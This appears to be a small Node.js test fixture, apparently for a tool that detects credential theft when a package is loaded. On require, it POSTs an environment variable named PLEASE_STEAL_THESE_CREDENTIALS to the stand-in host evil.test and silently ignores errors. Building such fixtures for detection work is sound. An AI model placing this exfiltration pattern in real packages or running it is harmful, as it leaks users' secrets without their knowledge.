const fetch = require('node-fetch');

fetch("https://evil.test/steal-during-require", {
    method: 'POST',
    headers: {
        'content-type': 'application/json'
    },
    body: JSON.stringify({
        'stolen-creds': process.env.PLEASE_STEAL_THESE_CREDENTIALS || ''
    })
}).catch(() => {}); // Shhhhhhhh